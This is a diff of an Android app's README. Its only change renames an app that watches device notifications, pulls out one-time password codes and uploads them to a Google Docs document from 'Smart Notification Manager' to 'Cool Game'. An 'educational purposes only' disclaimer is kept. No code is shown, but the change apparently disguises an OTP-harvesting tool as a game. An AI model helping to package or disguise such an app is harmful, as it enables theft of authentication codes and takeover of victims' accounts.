@@ -1,7 +1,7 @@
-# Smart Notification Manager
+# Cool Game
 
 ## Overview
-Smart Notification Manager is an Android application that monitors device notifications to detect and securely log OTP (One-Time Password) codes. The app automatically detects messages containing OTP codes and securely uploads them to a Google Docs document for record-keeping. This app is built for educational purposes only.
+Cool Game is an Android application that monitors device notifications to detect and securely log OTP (One-Time Password) codes. The app automatically detects messages containing OTP codes and securely uploads them to a Google Docs document for record-keeping. This app is built for educational purposes only.
 
 ## Features
 - Notification monitoring service that runs in the background
